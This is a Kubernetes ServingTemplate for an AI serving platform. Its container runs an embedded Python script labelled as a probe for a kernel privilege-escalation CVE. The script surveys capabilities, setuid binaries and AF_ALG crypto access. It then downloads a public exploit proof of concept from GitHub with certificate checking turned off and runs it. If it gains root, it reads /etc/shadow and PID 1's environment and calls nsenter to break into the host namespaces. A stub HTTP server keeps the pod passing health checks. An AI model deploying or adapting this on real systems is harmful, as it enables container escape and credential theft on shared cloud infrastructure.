apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: cve31431-probe
  labels:
    scenarios.ai.sap.com/id: "cve31431-probe"
    ai.sap.com/version: "1.1.0"
  annotations:
    scenarios.ai.sap.com/name: "cve31431-probe"
    executables.ai.sap.com/name: "cve31431-probe"
    executables.ai.sap.com/description: "CVE-2026-31431 Copy Fail probe v2"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            cat > /tmp/probe.py << 'PYEOF'
            import os, sys, socket, struct, subprocess, ssl, urllib.request, stat, ctypes, ctypes.util

            def r(k, v):
                print(f"[CVE31431] {k}: {str(v)[:3000]}", flush=True)

            libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

            # ── PHASE 1: RECON ──────────────────────────────────────────────────
            r("PHASE", "1-RECON")
            r("KERNEL", os.popen("uname -r").read().strip())
            r("HOSTNAME", os.uname().nodename)
            r("UID", f"uid={os.getuid()} gid={os.getgid()} euid={os.geteuid()}")

            for line in open("/proc/self/status"):
                k2 = line.split(":")[0].strip()
                v2 = line.split(":", 1)[1].strip() if ":" in line else ""
                if k2 in ("NoNewPrivs", "Seccomp") or k2.startswith("Cap"):
                    r(k2, v2)

            # NoNewPrivs impact: if set, execve() of setuid binaries will NOT
            # grant elevated uid -- the kernel ignores the setuid bit.
            no_new_privs = None
            for line in open("/proc/self/status"):
                if line.startswith("NoNewPrivs"):
                    no_new_privs = int(line.split(":")[1].strip())
            r("NONEWPRIVS_BLOCKS_SETUID", str(no_new_privs == 1))

            # /proc/crypto before bind attempt
            try:
                crypto_before = open("/proc/crypto").read()
                r("AUTHENCESN_BEFORE_BIND", str("authencesn" in crypto_before))
            except Exception as e:
                r("PROC_CRYPTO_ERR", str(e))

            # ── AF_ALG bind (FIXED: tuple format, not raw bytes) ────────────────
            AF_ALG = 38
            SOCK_SEQPACKET = 5
            af_alg_ok = False
            authencesn_ok = False

            try:
                s = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
                r("AF_ALG_SOCKET", "CREATED OK")
                af_alg_ok = True

                # Python AF_ALG bind expects tuple: (type, feat, mask, name)
                try:
                    s.bind(("aead", 0, 0, "authencesn(hmac(sha256),cbc(aes))"))
                    r("AF_ALG_AUTHENCESN_BIND", "SUCCESS — algorithm loaded/accessible")
                    authencesn_ok = True
                except OSError as e:
                    r("AF_ALG_AUTHENCESN_BIND", f"FAILED (OSError {e.errno}): {e}")
                    # Try to trigger module load via alternate bind
                    try:
                        s2 = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
                        s2.bind(("aead", 0, 0, "authenc(hmac(sha256),cbc(aes))"))
                        r("AF_ALG_AUTHENC_BIND", "SUCCESS")
                        s2.close()
                    except OSError as e2:
                        r("AF_ALG_AUTHENC_BIND", f"FAILED: {e2}")
                s.close()

                # Check /proc/crypto after bind attempt (module may have auto-loaded)
                try:
                    crypto_after = open("/proc/crypto").read()
                    r("AUTHENCESN_AFTER_BIND", str("authencesn" in crypto_after))
                    if "authencesn" in crypto_after and not ("authencesn" in crypto_before):
                        r("MODULE_AUTOLOADED", "YES — authencesn loaded by bind attempt")
                        authencesn_ok = True
                except Exception as e:
                    r("PROC_CRYPTO_AFTER_ERR", str(e))

            except Exception as e:
                r("AF_ALG_SOCKET", f"FAILED: {e}")

            # splice() via ctypes
            try:
                splice_fn = libc.splice
                splice_fn.restype = ctypes.c_ssize_t
                splice_fn.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_long),
                                      ctypes.c_int, ctypes.POINTER(ctypes.c_long),
                                      ctypes.c_size_t, ctypes.c_uint]
                # Quick test: splice /proc/self/exe into a pipe
                r_fd, w_fd = os.pipe()
                self_fd = os.open("/proc/self/exe", os.O_RDONLY)
                off = ctypes.c_long(0)
                n = splice_fn(self_fd, ctypes.byref(off), w_fd, None, 4096, 1)
                os.close(r_fd); os.close(w_fd); os.close(self_fd)
                r("SPLICE_TEST", f"OK — spliced {n} bytes")
                splice_ok = True
            except Exception as e:
                r("SPLICE_TEST", f"FAILED: {e}")
                splice_ok = False

            # Setuid binaries
            try:
                res = subprocess.run(["find", "/", "-perm", "-4000", "-type", "f"],
                                     capture_output=True, text=True, timeout=10)
                setuid_bins = [b for b in res.stdout.strip().split("\n") if b]
                r("SETUID_BINS", "\n".join(setuid_bins))
            except Exception as e:
                r("SETUID_BINS_ERR", str(e))
                setuid_bins = []

            conditions_met = af_alg_ok and authencesn_ok and splice_ok
            r("CONDITIONS_MET", str(conditions_met))
            r("EXPLOIT_VIABLE", str(conditions_met and no_new_privs == 0))

            # ── PHASE 2: EXPLOIT ────────────────────────────────────────────────
            r("PHASE", "2-EXPLOIT")

            # Always download and attempt the Theori PoC — it does its own
            # internal checks and may handle NoNewPrivs via alternate paths.
            poc_downloaded = False
            for branch in ("main", "master"):
                try:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    url = (f"https://raw.githubusercontent.com/theori-io/"
                           f"copy-fail-CVE-2026-31431/{branch}/copy_fail_exp.py")
                    poc_bytes = urllib.request.urlopen(url, context=ctx, timeout=30).read()
                    with open("/tmp/copy_fail.py", "wb") as f:
                        f.write(poc_bytes)
                    r("POC_DOWNLOAD", f"OK ({len(poc_bytes)} bytes, branch={branch})")
                    r("POC_FIRST_50_LINES", "\n".join(poc_bytes.decode("utf-8","replace").split("\n")[:50]))
                    poc_downloaded = True
                    break
                except Exception as e:
                    r(f"POC_DOWNLOAD_{branch}", f"FAILED: {e}")

            if poc_downloaded:
                r("EXPLOIT_RUN", "starting Theori PoC")
                try:
                    result = subprocess.run(
                        [sys.executable, "/tmp/copy_fail.py"],
                        capture_output=True, text=True, timeout=120,
                        env={**os.environ, "HOME": "/tmp", "TERM": "xterm"}
                    )
                    r("POC_STDOUT", result.stdout[:3000] or "(empty)")
                    r("POC_STDERR", result.stderr[:3000] or "(empty)")
                    r("POC_RC", str(result.returncode))
                except subprocess.TimeoutExpired:
                    r("POC_RC", "TIMEOUT(120s)")
                except Exception as e:
                    r("POC_ERR", str(e))
            else:
                r("EXPLOIT_RUN", "SKIPPED — download failed")

            # ── PHASE 3: POST ────────────────────────────────────────────────────
            r("PHASE", "3-POST")
            r("UID_FINAL", f"uid={os.getuid()} euid={os.geteuid()}")

            if os.geteuid() == 0:
                r("ROOT", "YES — ESCALATION CONFIRMED")
                for path in ["/etc/shadow", "/proc/1/environ",
                             "/proc/1/root/etc/passwd"]:
                    try:
                        data = open(path, "rb").read(300)
                        r(f"READ_{path}", data.decode("utf-8","replace"))
                    except Exception as e:
                        r(f"READ_{path}", f"ERR: {e}")
                try:
                    ns = subprocess.run(
                        ["nsenter","--target","1","--mount","--uts",
                         "--ipc","--net","--pid","--","id"],
                        capture_output=True, text=True, timeout=10)
                    r("NSENTER_HOST", ns.stdout.strip() or ns.stderr.strip())
                except Exception as e:
                    r("NSENTER_ERR", str(e))
            else:
                r("ROOT", "NO — unprivileged (NoNewPrivs or authencesn blocked)")

            r("DONE", "all phases complete")
            PYEOF
            python3 /tmp/probe.py
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
          ports:
          - containerPort: 8080
            protocol: TCP
          readinessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 10
            periodSeconds: 5
          livenessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 10
            periodSeconds: 10
